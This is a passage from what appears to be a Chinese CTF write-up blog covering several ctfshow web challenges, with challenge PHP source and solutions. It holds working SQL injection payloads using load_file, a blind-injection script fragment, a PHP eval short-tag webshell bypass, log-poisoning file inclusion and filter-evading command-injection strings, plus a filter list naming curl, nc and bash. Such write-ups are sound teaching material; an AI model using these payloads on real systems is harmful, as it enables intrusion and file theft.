r1.text:</span><br><span class="line">                flag+=chr(mid)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r=requests.get(url+p1)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>跑出来flag不在这，其实那个过滤很鸡肋，直接反引号就可以绕过，并且可以联合查询，沙雕了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?query&#x3D;1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;1%23</span><br><span class="line"></span><br><span class="line">?query&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;here_1s_your_f1ag.php&#39;)%23</span><br></pre></td></tr></table></figure><p><code>here_1s_your_f1ag.php</code>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> sql();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;query&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;query&#x27;</span>] !== <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">$id = $_GET[<span class="string">&#x27;query&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/information_schema\.tables|information_schema\.columns|linestring| |polygon/is&#x27;</span>, $_GET[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;@A@&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$id = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql_ = <span class="string">&quot;select username from content where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">$db = <span class="keyword">new</span> sql();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.$db-&gt;getone($sql_)[<span class="number">0</span>].<span class="string">&quot;&#x27;)</span></span><br></pre></td></tr></table></figure><p>通过查看<code>secret.php</code>得到flag的位置，读flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;load_file(&#39;&#x2F;real_flag_is_here&#39;)%23</span><br></pre></td></tr></table></figure><h3 id="web15-Fishman"><a href="#web15-Fishman" class="headerlink" title="web15 Fishman"></a>web15 Fishman</h3><h3 id="WEB-给你shell-36D杯"><a href="#WEB-给你shell-36D杯" class="headerlink" title="WEB_给你shell_36D杯"></a>WEB_给你shell_36D杯</h3><p>查看源码发现<code>?view_source</code>，得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;view_source&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $arr = explode(<span class="string">&#x27;:&#x27;</span>, $s);</span><br><span class="line">    <span class="keyword">if</span> ($arr[<span class="number">0</span>] === <span class="string">&#x27;&#123;&quot;secret&quot;&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^[\&quot;0-9A-Z]*&#125;$/&#x27;</span>, $arr[<span class="number">1</span>]) &amp;&amp; count($arr) === <span class="number">2</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !theFirstTimeSetCookie() ) setcookie(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#x27;</span>, time()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">haveFun</span>(<span class="params">$_f_g</span>) </span>&#123;</span><br><span class="line">    $_g_r = <span class="number">32</span>;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, <span class="number">1</span>);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;secret&#x27;</span>]) ? $json = $_COOKIE[<span class="string">&#x27;secret&#x27;</span>] : setcookie(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;&#123;&quot;secret&quot;:&quot;&#x27;</span> . strtoupper(md5(<span class="string">&#x27;y1ng&#x27;</span>)) . <span class="string">&#x27;&quot;&#125;&#x27;</span>, time()+<span class="number">7200</span> );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, <span class="literal">true</span>) : <span class="keyword">die</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($obj &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;give_me_shell&#x27;</span>])) &#123;</span><br><span class="line">    ($obj[<span class="string">&#x27;secret&#x27;</span>] != $flag_md5 ) ? haveFun($flag) : <span class="keyword">echo</span> <span class="string">&quot;here is your webshell: <span class="subst">$shell_path</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>; </span><br></pre></td></tr></table></figure><p>先看下haveFun函数，输出<code>$_i &amp; 0xC0</code>，<code>0xC0</code>二进制形式<code>11000000</code>，由于数字的ascii码范围为48-57，大写字母的ascii码范围65-90，小写字母的范围97-122</p><p>因此与运算的结果只有两种:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000&#x3D;&#x3D;&gt;0</span><br><span class="line">01000000&#x3D;&#x3D;&gt; 64</span><br></pre></td></tr></table></figure><p>并且为数字的时候由于ascii小于64，因此计算结果为0，同理，为大小写字母时计算结果为64</p><p>由返回结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0006464640064064646464006406464064640064006400000000000</span><br></pre></td></tr></table></figure><p>md5前三个字符均为数字，又：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$obj[<span class="string">&#x27;secret&#x27;</span>] != $flag_md5</span><br><span class="line"><span class="comment">// 123==&#x27;123a&#x27;</span></span><br></pre></td></tr></table></figure><p>比较是弱比较，因此我们可以用弱类型绕过，尝试爆破：</p><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200912152527.png"></p><p>注意不能是：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;secret&quot;</span>:<span class="string">&quot;115&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>访问得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//there are some secret waf that you will never know, fuzz me if you can</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;hidden_filter.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">&#x27;login&#x27;</span>])</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=\&#x27;./index.php\&#x27;&lt;/script&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        <span class="comment">//清空session 从头再来</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;\$_SESSION[&quot;</span> . $code . <span class="string">&quot;]=false;&quot;</span>); <span class="comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When you feel that you are lost, do not give up, fight and move on.</span></span><br><span class="line"><span class="comment"> * Being a hacker is not easy, it requires effort and sacrifice.</span></span><br><span class="line"><span class="comment"> * But remember … we are legion!</span></span><br><span class="line"><span class="comment"> *  ————Deep CTF 2020</span></span><br><span class="line"><span class="comment">*/</span> </span><br></pre></td></tr></table></figure><p>fuzz一下，发现下面的都不能用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96; ; include &#39; &quot;</span><br></pre></td></tr></table></figure><p>可以用短标签，以下均可以正常允许</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`ls`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;1]&#x3D;1?&gt;&lt;?&#x3D;require~%D0%99%93%9E%98?&gt;</span><br></pre></td></tr></table></figure><h3 id="WEB-RemoteImageDownloader-36D"><a href="#WEB-RemoteImageDownloader-36D" class="headerlink" title="WEB_RemoteImageDownloader_36D"></a>WEB_RemoteImageDownloader_36D</h3><h3 id="WEB-ALL-INFO-U-WANT-36D"><a href="#WEB-ALL-INFO-U-WANT-36D" class="headerlink" title="WEB_ALL_INFO_U_WANT_36D"></a>WEB_ALL_INFO_U_WANT_36D</h3><p>扫目录发现<code>index.php.bak</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">phpvisit all_info_u_want.php <span class="keyword">and</span> you will get all information you want</span><br><span class="line"></span><br><span class="line">= =Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//give you all information you want</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;all_info_i_want&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    $file = <span class="string">&quot;/var/www/html/&quot;</span> . $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="comment">//really baby include</span></span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">really really really baby challenge right? </span><br></pre></td></tr></table></figure><p>访问包含flag提示是假的，尝试getshell，预期解是包含<code>/var/log/nginx/access.log</code>，把一句话放在请求头里包含蚁剑连</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r -l <span class="string">&quot;flag&quot;</span>  /etc</span><br></pre></td></tr></table></figure><p>找到<code>/etc/opt/secret/what_you_want</code></p><p>另外一种办法是包含自身，构造：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://591caabf-a243-4850-8254-3c4f913b12e2.chall.ctf.show/all_info_u_want.php?file=all_info_u_want.php&amp;all_info_i_want&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/17/ctfshow%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/QQ%E6%88%AA%E5%9B%BE20200912204747.png"></p><h3 id="WEB-WUSTCTF朴实无华Revenge-36D杯"><a href="#WEB-WUSTCTF朴实无华Revenge-36D杯" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge_36D杯"></a>WEB_WUSTCTF朴实无华Revenge_36D杯</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[^0-9.-]/&#x27;</span>, $num)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($numPositve &lt;= <span class="number">-999999999999999999</span> || $numPositve &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;more&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;tail&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;less&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;head&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;tac&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;sort&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">去非洲吧</span><br></pre></td></tr></table></figure><p>先看第一关，大概意思就是两个条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval($num)&#x3D;&#x3D;&#x3D;intval(strrev($num))</span><br><span class="line">$num!&#x3D;strrev($num)并且$num只包含0-9.-</span><br></pre></td></tr></table></figure><p>所以可以构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;9.-9</span><br><span class="line">?num&#x3D;00.0</span><br><span class="line">?num&#x3D;10.010</span><br></pre></td></tr></table></figure><p>再看第二关</p><p>双MD5与本身弱相等</p><p>直接用<code>0e1138100474</code>，最后一关命令执行，可以用<code>\</code>和<code>%09</code>绕过，payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;10.010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t%09&#x2F;flag</span><br><span class="line">?num&#x3D;10.010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t&lt;&#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="WEB-Login-Only-For-36D-36D"><a href="#WEB-Login-Only-For-36D-36D" class="headerlink" title="WEB_Login_Only_For_36D_36D"></a>WEB_Login_Only_For_36D_36D</h3><p>查看源码,发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- if (!preg_match(&#39;&#x2F;admin&#x2F;&#39;, $uname)) die; --&gt;</span><br><span class="line">&lt;!-- select * from 36d_user where username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39;; --&gt;</span><br></pre></td></tr></table></figure><p>fuzz一下，发现过滤了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39; &quot; | 空格 ascii substr &#x3D; and 